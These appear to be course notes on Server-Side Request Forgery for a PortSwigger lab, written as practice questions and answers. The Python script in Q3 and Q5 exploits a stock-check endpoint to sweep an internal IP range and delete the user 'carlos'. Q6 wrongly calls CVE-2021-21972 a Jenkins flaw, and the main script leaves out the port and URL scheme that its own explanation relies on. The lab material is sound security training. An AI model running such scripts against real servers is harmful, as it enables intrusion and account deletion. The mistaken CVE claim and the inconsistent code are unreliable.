---
course: Web Security
topic: Server-Side Request Forgery (SSRF)
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain what SSRF (Server-Side Request Forgery) is and how it can be exploited in the context of the given lab.**

SSRF (Server-Side Request Forgery) is a type of web security vulnerability that allows an attacker to induce a vulnerable application to make HTTP requests to arbitrary domains. In the context of the given lab, the stock check functionality is vulnerable to SSRF, allowing an attacker to scan internal IP addresses for an admin interface on port 8080. By exploiting this vulnerability, an attacker can identify the IP address hosting the admin interface and subsequently delete the user Carlos.

**Q2. How would you use Burp Suite to automate the scanning of the internal IP range for an admin interface?**

To automate the scanning of the internal IP range for an admin interface using Burp Suite:

1. Intercept the initial request to the stock check functionality in Burp Suite.
2. Send the request to the Intruder tab.
3. Set the IP address parameter to be fuzzed.
4. Configure the payload set to sequentially iterate through the IP range (e.g., 192.168.0.1 to 192.168.0.255).
5. Run the Intruder attack to scan the IP range.
6. Analyze the responses to identify any IP addresses that return a 200 status code, indicating the presence of an admin interface.

**Q3. Write a Python script to automate the process of identifying the admin interface and deleting the user Carlos.**

```python
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def main(url):
    if len(url.split()) != 2:
        print("Usage: python script.py <URL>")
        return
    
    url = url.split()[1]
    admin_ip = check_admin_hostname(url)
    
    if admin_ip:
        print(f"Found admin IP address: {admin_ip}")
        delete_carlos_user(url, admin_ip)
    else:
        print("Could not find admin host name")

def check_admin_hostname(url):
    check_stock_path = "/product/stock"
    admin_ip = ""
    
    for i in range(1, 256):
        hostname = f"192.168.0.{i}"
        params = {'stockApi': hostname}
        
        response = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
        
        if response.status_code == 200:
            admin_ip = hostname
            break
    
    return admin_ip

def delete_carlos_user(url, admin_ip):
    delete_url = f"http://{admin_ip}/delete?username=carlos"
    check_stock_path = "/product/stock"
    params = {'stockApi': delete_url}
    
    response = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
    
    if response.status_code == 302:
        print("Successfully deleted Carlos user")
    else:
        print("Exploit was unsuccessful")

if __name__ == "__main__":
    import sys
    main(' '.join(sys.argv))
```

**Q4. Why is it important to disable SSL certificate verification in the Python script?**

Disabling SSL certificate verification in the Python script is important because the internal systems may use self-signed certificates or invalid certificates. Disabling verification allows the script to communicate with these systems without encountering SSL certificate validation errors. However, this should be done cautiously in a controlled environment to avoid potential security risks.

**Q5. How would you modify the script to handle different port numbers when searching for the admin interface?**

To modify the script to handle different port numbers when searching for the admin interface, you can include a port parameter and format the hostname accordingly:

```python
def check_admin_hostname(url, port=8080):
    check_stock_path = "/product/stock"
    admin_ip = ""
    
    for i in range(1, 256):
        hostname = f"192.168.0.{i}:{port}"
        params = {'stockApi': hostname}
        
        response = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
        
        if response.status_code == 200:
            admin_ip = hostname
            break
    
    return admin_ip
```

This modification allows the script to search for the admin interface on a specified port, enhancing its flexibility and utility in different scenarios.

**Q6. Explain how recent real-world examples such as CVE-2021-21972 demonstrate the importance of mitigating SSRF vulnerabilities.**

CVE-2021-21972 is a critical SSRF vulnerability discovered in the Jenkins CI/CD platform. This vulnerability allowed attackers to exploit the Jenkins plugin to make arbitrary HTTP requests, potentially leading to unauthorized access to internal systems and sensitive data. This real-world example underscores the importance of mitigating SSRF vulnerabilities by implementing proper input validation, restricting the domains that the application can communicate with, and monitoring for unusual outbound traffic patterns.

---
<!-- nav -->
[[Web Security (PortSwigger)/09-Server-Side Request Forgery (SSRF)/03-Lab 2 Basic SSRF against another back end system/01-Introduction to Server-Side Request Forgery (SSRF)|Introduction to Server-Side Request Forgery (SSRF)]] | [[Web Security (PortSwigger)/09-Server-Side Request Forgery (SSRF)/03-Lab 2 Basic SSRF against another back end system/00-Overview|Overview]]
